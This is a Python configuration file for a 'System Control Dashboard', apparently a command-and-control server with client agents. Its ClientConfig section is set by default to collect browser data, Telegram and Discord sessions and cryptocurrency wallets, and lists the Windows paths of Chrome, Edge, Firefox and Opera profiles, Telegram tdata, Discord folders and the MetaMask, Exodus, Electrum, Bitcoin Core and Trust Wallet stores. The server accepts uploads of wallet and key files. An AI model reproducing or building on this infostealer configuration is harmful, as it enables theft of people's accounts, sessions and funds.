#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Configuration file for System Control Dashboard
"""
import os
from datetime import timedelta

class Config:
    """Base configuration"""
    # Flask settings
    SECRET_KEY = os.environ.get("SECRET_KEY", "your-very-secure-secret-key-change-this-in-production")
    DEBUG = os.environ.get("FLASK_ENV") == "development"
    
    # Database settings
    DATABASE_PATH = os.environ.get("DATABASE_PATH", "dashboard.db")
    DATABASE_URL = os.environ.get("DATABASE_URL")  # For PostgreSQL if needed
    
    # Upload settings
    UPLOAD_FOLDER = os.environ.get("UPLOAD_FOLDER", "uploads")
    MAX_CONTENT_LENGTH = 500 * 1024 * 1024  # 500MB
    ALLOWED_EXTENSIONS = {
        'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 
        'xls', 'xlsx', 'zip', 'rar', '7z', 'json', 'xml', 'csv',
        'log', 'db', 'sqlite', 'dat', 'wallet', 'key'
    }
    
    # Authentication settings
    ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
    ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
    AGENT_TOKEN = os.environ.get("AGENT_TOKEN", "secure-agent-token-change-this")
    
    # Session settings
    SESSION_TIMEOUT = int(os.environ.get("SESSION_TIMEOUT", "3600"))  # 1 hour
    PERMANENT_SESSION_LIFETIME = timedelta(seconds=SESSION_TIMEOUT)
    SESSION_COOKIE_SECURE = os.environ.get("SESSION_COOKIE_SECURE", "False").lower() == "true"
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    
    # Client connection settings
    CLIENT_TIMEOUT = int(os.environ.get("CLIENT_TIMEOUT", "300"))  # 5 minutes
    MAX_CLIENTS = int(os.environ.get("MAX_CLIENTS", "100"))
    HEARTBEAT_INTERVAL = int(os.environ.get("HEARTBEAT_INTERVAL", "30"))  # 30 seconds
    
    # SocketIO settings
    SOCKETIO_PING_TIMEOUT = int(os.environ.get("SOCKETIO_PING_TIMEOUT", "60"))
    SOCKETIO_PING_INTERVAL = int(os.environ.get("SOCKETIO_PING_INTERVAL", "25"))
    SOCKETIO_CORS_ALLOWED_ORIGINS = os.environ.get("SOCKETIO_CORS_ALLOWED_ORIGINS", "*")
    
    # Data retention settings
    BACKUP_RETENTION_DAYS = int(os.environ.get("BACKUP_RETENTION_DAYS", "30"))
    LOG_RETENTION_DAYS = int(os.environ.get("LOG_RETENTION_DAYS", "7"))
    COMMAND_RETENTION_DAYS = int(os.environ.get("COMMAND_RETENTION_DAYS", "14"))
    FILE_RETENTION_DAYS = int(os.environ.get("FILE_RETENTION_DAYS", "60"))
    
    # Server settings
    PORT = int(os.environ.get("PORT", "5000"))
    HOST = os.environ.get("HOST", "0.0.0.0")
    
    # Security settings
    FORCE_HTTPS = os.environ.get("FORCE_HTTPS", "False").lower() == "true"
    TRUSTED_PROXIES = os.environ.get("TRUSTED_PROXIES", "").split(",") if os.environ.get("TRUSTED_PROXIES") else []
    
    # Logging settings
    LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO")
    LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    LOG_FILE = os.environ.get("LOG_FILE", "dashboard.log")
    
    # Background task settings
    CLEANUP_INTERVAL = int(os.environ.get("CLEANUP_INTERVAL", "300"))  # 5 minutes
    HEALTH_CHECK_INTERVAL = int(os.environ.get("HEALTH_CHECK_INTERVAL", "60"))  # 1 minute
    
    # Rate limiting settings
    RATELIMIT_STORAGE_URL = os.environ.get("REDIS_URL")  # For Redis-based rate limiting
    RATELIMIT_DEFAULT = "100/hour"
    RATELIMIT_LOGIN = "10/minute"
    RATELIMIT_API = "200/hour"
    
    # External service settings
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")  # For notifications
    EMAIL_SMTP_SERVER = os.environ.get("EMAIL_SMTP_SERVER")
    EMAIL_SMTP_PORT = int(os.environ.get("EMAIL_SMTP_PORT", "587"))
    EMAIL_USERNAME = os.environ.get("EMAIL_USERNAME")
    EMAIL_PASSWORD = os.environ.get("EMAIL_PASSWORD")
    NOTIFICATION_EMAIL = os.environ.get("NOTIFICATION_EMAIL")

class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True
    LOG_LEVEL = "DEBUG"
    SESSION_COOKIE_SECURE = False
    SOCKETIO_CORS_ALLOWED_ORIGINS = "*"

class ProductionConfig(Config):
    """Production configuration"""
    DEBUG = False
    SESSION_COOKIE_SECURE = True
    FORCE_HTTPS = True
    LOG_LEVEL = "INFO"
    
    # More restrictive settings for production
    RATELIMIT_DEFAULT = "50/hour"
    RATELIMIT_LOGIN = "5/minute"
    
    # Security headers
    SECURITY_HEADERS = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' cdnjs.cloudflare.com; font-src 'self' cdnjs.cloudflare.com"
    }

class TestingConfig(Config):
    """Testing configuration"""
    TESTING = True
    DEBUG = True
    DATABASE_PATH = ":memory:"  # In-memory SQLite for testing
    SECRET_KEY = "test-secret-key"
    AGENT_TOKEN = "test-agent-token"
    WTF_CSRF_ENABLED = False

# Configuration mapping
config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}

def get_config():
    """Get configuration based on environment"""
    env = os.environ.get('FLASK_ENV', 'default')
    return config.get(env, config['default'])

# Client Agent Configuration
class ClientConfig:
    """Configuration for client agents"""
    
    # Connection settings
    SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:5000")
    API_URL = os.environ.get("API_URL", "http://localhost:5000/api")
    AGENT_TOKEN = os.environ.get("AGENT_TOKEN", "secure-agent-token-change-this")
    
    # Client identification
    CLIENT_NAME = os.environ.get("CLIENT_NAME")  # Will use hostname if not set
    CLIENT_ID = os.environ.get("CLIENT_ID")  # Will use MAC address if not set
    
    # Connection behavior
    RECONNECT_DELAY = int(os.environ.get("RECONNECT_DELAY", "5"))
    HEARTBEAT_INTERVAL = int(os.environ.get("HEARTBEAT_INTERVAL", "30"))
    CONNECTION_TIMEOUT = int(os.environ.get("CONNECTION_TIMEOUT", "30"))
    MAX_RECONNECT_ATTEMPTS = int(os.environ.get("MAX_RECONNECT_ATTEMPTS", "10"))
    
    # File handling
    MAX_FILE_SIZE = int(os.environ.get("MAX_FILE_SIZE", "104857600"))  # 100MB
    TEMP_DIR = os.environ.get("TEMP_DIR")  # Will use system temp if not set
    
    # Backup settings
    BACKUP_COMPRESSION = os.environ.get("BACKUP_COMPRESSION", "True").lower() == "true"
    BACKUP_ENCRYPTION = os.environ.get("BACKUP_ENCRYPTION", "False").lower() == "true"
    BACKUP_SPLIT_SIZE = int(os.environ.get("BACKUP_SPLIT_SIZE", "52428800"))  # 50MB
    
    # Data collection settings
    COLLECT_BROWSER_DATA = os.environ.get("COLLECT_BROWSER_DATA", "True").lower() == "true"
    COLLECT_CRYPTO_WALLETS = os.environ.get("COLLECT_CRYPTO_WALLETS", "True").lower() == "true"
    COLLECT_TELEGRAM = os.environ.get("COLLECT_TELEGRAM", "True").lower() == "true"
    COLLECT_DISCORD = os.environ.get("COLLECT_DISCORD", "True").lower() == "true"
    COLLECT_SYSTEM_INFO = os.environ.get("COLLECT_SYSTEM_INFO", "True").lower() == "true"
    
    # Browser paths (Windows-focused)
    BROWSER_PATHS = {
        "chrome": [
            "%LOCALAPPDATA%/Google/Chrome/User Data",
            "%USERPROFILE%/AppData/Local/Google/Chrome/User Data"
        ],
        "edge": [
            "%LOCALAPPDATA%/Microsoft/Edge/User Data",
            "%USERPROFILE%/AppData/Local/Microsoft/Edge/User Data"
        ],
        "firefox": [
            "%APPDATA%/Mozilla/Firefox/Profiles",
            "%USERPROFILE%/AppData/Roaming/Mozilla/Firefox/Profiles"
        ],
        "opera": [
            "%APPDATA%/Opera Software/Opera Stable",
            "%USERPROFILE%/AppData/Roaming/Opera Software/Opera Stable"
        ]
    }
    
    # Telegram paths
    TELEGRAM_PATHS = [
        "%APPDATA%/Telegram Desktop/tdata",
        "%LOCALAPPDATA%/Telegram Desktop/tdata",
        "%USERPROFILE%/AppData/Roaming/Telegram Desktop/tdata",
        "%USERPROFILE%/AppData/Local/Telegram Desktop/tdata"
    ]
    
    # Discord paths
    DISCORD_PATHS = [
        "%APPDATA%/discord",
        "%LOCALAPPDATA%/Discord",
        "%USERPROFILE%/AppData/Roaming/discord",
        "%USERPROFILE%/AppData/Local/Discord"
    ]
    
    # Cryptocurrency wallet paths
    CRYPTO_WALLET_PATHS = {
        "metamask": [
            "%LOCALAPPDATA%/Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            "%APPDATA%/MetaMask"
        ],
        "exodus": [
            "%APPDATA%/Exodus",
            "%LOCALAPPDATA%/Exodus"
        ],
        "electrum": [
            "%APPDATA%/Electrum/wallets",
            "%LOCALAPPDATA%/Electrum/wallets"
        ],
        "bitcoin_core": [
            "%APPDATA%/Bitcoin/wallet.dat",
            "%USERPROFILE%/Bitcoin/wallet.dat"
        ],
        "trust_wallet": [
            "%LOCALAPPDATA%/TrustWallet",
            "%APPDATA%/TrustWallet"
        ]
    }
    
    # Logging settings
    LOG_LEVEL = os.environ.get("CLIENT_LOG_LEVEL", "INFO")
    LOG_FILE = os.environ.get("CLIENT_LOG_FILE", "system_agent.log")
    LOG_MAX_SIZE = int(os.environ.get("LOG_MAX_SIZE", "10485760"))  # 10MB
    LOG_BACKUP_COUNT = int(os.environ.get("LOG_BACKUP_COUNT", "5"))

# Validation functions
def validate_config():
    """Validate configuration settings"""
    errors = []
    
    config_obj = get_config()
    
    # Check required settings
    if not config_obj.SECRET_KEY or config_obj.SECRET_KEY == "your-very-secure-secret-key-change-this":
        errors.append("SECRET_KEY must be set to a secure random value")
    
    if not config_obj.AGENT_TOKEN or config_obj.AGENT_TOKEN == "secure-agent-token-change-this":
        errors.append("AGENT_TOKEN must be set to a secure random value")
    
    if config_obj.ADMIN_PASSWORD == "admin123":
        errors.append("ADMIN_PASSWORD should be changed from default value")
    
    # Check file paths
    upload_folder = config_obj.UPLOAD_FOLDER
    if not os.path.exists(upload_folder):
        try:
            os.makedirs(upload_folder, exist_ok=True)
        except Exception as e:
            errors.append(f"Cannot create upload folder {upload_folder}: {e}")
    
    # Check numeric settings
    if config_obj.SESSION_TIMEOUT < 60:
        errors.append("SESSION_TIMEOUT should be at least 60 seconds")
    
    if config_obj.CLIENT_TIMEOUT < 30:
        errors.append("CLIENT_TIMEOUT should be at least 30 seconds")
    
    return errors

def print_config_summary():
    """Print configuration summary"""
    config_obj = get_config()
    
    print("=== System Control Dashboard Configuration ===")
    print(f"Environment: {os.environ.get('FLASK_ENV', 'development')}")
    print(f"Debug Mode: {config_obj.DEBUG}")
    print(f"Server Port: {config_obj.PORT}")
    print(f"Database: {config_obj.DATABASE_PATH}")
    print(f"Upload Folder: {config_obj.UPLOAD_FOLDER}")
    print(f"Admin Username: {config_obj.ADMIN_USERNAME}")
    print(f"Agent Token Set: {'Yes' if config_obj.AGENT_TOKEN != 'secure-agent-token-change-this' else 'No (Default)'}")
    print(f"Session Timeout: {config_obj.SESSION_TIMEOUT} seconds")
    print(f"Client Timeout: {config_obj.CLIENT_TIMEOUT} seconds")
    print(f"Max Clients: {config_obj.MAX_CLIENTS}")
    print(f"Backup Retention: {config_obj.BACKUP_RETENTION_DAYS} days")
    print(f"Log Retention: {config_obj.LOG_RETENTION_DAYS} days")
    print("=" * 50)

if __name__ == "__main__":
    # Validate and print configuration when run directly
    errors = validate_config()
    
    if errors:
        print("Configuration Errors:")
        for error in errors:
            print(f"  - {error}")
        print()
    
    print_config_summary()